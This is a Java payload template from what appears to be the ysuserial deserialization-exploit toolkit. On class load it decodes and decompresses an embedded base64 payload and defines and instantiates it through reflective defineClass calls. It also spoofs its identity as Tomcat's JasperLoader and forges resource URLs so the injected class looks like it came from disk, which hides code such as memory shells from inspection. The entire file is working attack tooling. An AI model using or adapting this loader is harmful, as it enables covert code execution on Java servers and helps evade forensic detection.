package org.su18.ysuserial.payloads.templates.classloader;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.net.URL;
import java.net.URLClassLoader;
import java.util.zip.GZIPInputStream;

/**
 * @author su18
 */
public class HideClassLoaderTemplate extends URLClassLoader {

	public HideClassLoaderTemplate() {
		super(new URL[0], Thread.currentThread().getContextClassLoader());
	}

	@Override
	public URL getResource(String name) {
		try {
			String dir   = System.getProperty("user.dir");
			URL    url   = new URL("file://" + dir);
			Field  field = url.getClass().getDeclaredField("path");
			field.setAccessible(true);
			field.set(url, "file:" + dir + "/classes/" + name.substring(0, name.length() - 6).replace(".", "/") + ".class");
			return url;
		} catch (Exception e) {
			throw new RuntimeException(e);
		}
	}

	@Override
	public String toString() {
		return "org.apache.jasper.servlet.JasperLoader";
	}

	static String b64;

	static {
		try {
			// 初始化
			initClassBytes();
			GZIPInputStream       gzipInputStream       = new GZIPInputStream(new ByteArrayInputStream(base64Decode(b64)));
			ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
			byte[]                bs                    = new byte[4096];
			int                   read;
			while ((read = gzipInputStream.read(bs)) != -1) {
				byteArrayOutputStream.write(bs, 0, read);
			}
			byte[]      bytes       = byteArrayOutputStream.toByteArray();
			ClassLoader classLoader = new HideClassLoaderTemplate();
			Method      defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
			defineClass.setAccessible(true);
			Class invoke = (Class) defineClass.invoke(classLoader, bytes, 0, bytes.length);
			invoke.newInstance();
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

	public static byte[] base64Decode(String bs) throws Exception {
		Class  base64;
		byte[] value = null;
		try {
			base64 = Class.forName("java.util.Base64");
			Object decoder = base64.getMethod("getDecoder", new Class[]{}).invoke(null, (Object[]) null);
			value = (byte[]) decoder.getClass().getMethod("decode", new Class[]{String.class}).invoke(decoder, new Object[]{bs});
		} catch (Exception e) {
			try {
				base64 = Class.forName("sun.misc.BASE64Decoder");
				Object decoder = base64.newInstance();
				value = (byte[]) decoder.getClass().getMethod("decodeBuffer", new Class[]{String.class}).invoke(decoder, new Object[]{bs});
			} catch (Exception ignored) {
			}
		}

		return value;
	}

	public static void initClassBytes() {
	}
}
